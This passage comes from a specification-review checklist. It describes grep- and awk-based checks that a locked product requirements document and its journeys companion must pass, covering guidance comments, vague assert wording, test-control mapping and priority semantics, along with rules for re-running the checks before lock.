decision that made this.)_` — every fence then cites nothing, and the ratification chain the whole
format rests on is hollow while every other check passes. Or a locked PRD whose Companions line
still reads `<prd-slug>-journeys.md`, naming four paths that resolve to nothing.

### 16. Guidance comments deleted

**What.** No template guidance survives into the locked document.

**Method.**

```bash
grep -rn -e '<!-- guidance' --include='*.md' -- "$docs" || true
```

Must return nothing. Scope it to the PRD and its four companions if the tree carries other
documents that legitimately use the marker.

Nothing else in this file can find an undeleted block. Check 12 strips HTML comments before
counting, so guidance costs nothing against the word budget; no other check parses comments at all.

**Failure looks like.** A builder reading the locked document and finding instructions for filling
a template — "Reshape a section that does not fit the product" — and reading them as rules of the
product.

### 17. Banned adjectives in asserts

**What.** Every `Assert` cell names a value, a state or a count.

**Method.** Over the journeys companion's case tables — the transition index and every `UJ` table:

```bash
[ -s "$journeys" ] || { echo "NOT-RUN: $journeys is absent or empty"; exit 3; }
asserts="$(mktemp)"
awk -F'|' '/^\| *(T[0-9]+|UJ[0-9]+\.[0-9]+-[a-z]) *\|/ {print $5}' "$journeys" > "$asserts"
[ -s "$asserts" ] || { echo "NOT-RUN: no case rows parsed from $journeys"; exit 3; }
grep -niE 'correct|unchanged|appropriate|as expected' -- "$asserts" || true
```

Must return nothing. Process rule 10 is this format's central oracle rule and nothing else here
tested it; this is four words and one grep.

**Failure looks like.** An `Assert` reading "the counts are correct" or "the list is unchanged" — a
builder cannot write that test, and a reviewer reading the row sees an oracle where there is none.

### 18. Test-controls map reconciliation

**What.** Every surface a case drives is declared, in the journeys companion's test-controls map or
in its Named defaults table.

**Method.** Parse the declared set: the map's `Surface` column plus the Named defaults table's
`Seam input` column. Parse the case set: every `When` cell of the transition index and the `UJ`
tables. Then produce two lists — for each declared surface, the cases that drive it (a declared
surface no case drives), and each `When` cell that matches no declared surface. Both parses are
guarded; an empty map or an empty case set is NOT-RUN. The second list is read by a human, because
a `When` cell is prose; the enumeration is what is mechanical.

The journeys template says this map is what makes the harness statement's "declare every exercised
seam input" checkable, and nothing reconciled cases against it — so the map could be complete,
empty or stale and every other check still passed.

**Failure looks like.** A case driving a surface the map does not declare — asserting through a
seam nobody declared, which is exactly what the harness statement forbids. Or a map line for a
surface no case drives, which is a control nothing exercises.

### 19. Exactly one priority semantic

**What.** Exactly one of the Legend's two priority-semantics bullets survives to lock.

**Method.**

```bash
[ -s "$prd" ] || { echo "NOT-RUN: $prd is absent or empty"; exit 3; }
grep -cE '^- \*\*(Build order within the release|Cut line)' -- "$prd"
```

The count must be exactly `1`. Two is the template shipped unresolved; zero is as bad and is a MISS
just as loudly — with neither bullet the `Pri` column has no declared meaning at all, and Phase 5's
priority pass has nothing to answer against.

**Failure looks like.** Both bullets left in place, so this document's `Pri` has two readings at
once — and check 1b then compares a build-order `P1` here against a cut-line `P1` in a sibling and
reports that the two documents agree.

---

## When the checks run

**The clean result must belong to the document that locks.** The checks run **before the pre-lock
round**, and **again after the last edit of that round's fix pass** — that second run is the state
that actually locks.

**Any edit after a clean result re-runs all of them.** A row, an Open Question, a fence, the Legend,
the fence-to-row map, the transition index, a companion file — and an editorial edit is still an
edit for this purpose. **A result recorded for an earlier state does not carry forward**, and the
review log records which revision each run covered so that a later reader can tell. A diff check
also records the `(base, head)` pair it ran against; without that pair its result is not a result.

**Clean means PASS, not silence.** The lock record lists every check by number with its PASS, MISS
or NOT-RUN, and lock requires zero MISSes and zero NOT-RUNs — except the diff checks the
Applicability section records NOT-RUN on a first lock, and any other NOT-RUN the owner accepts by
name in a dated fence.

The same checks re-run before any re-lock: a refactor of a locked PRD, a companion split, an
amendment that moves rows, and the bookkeeping close of a conversion.
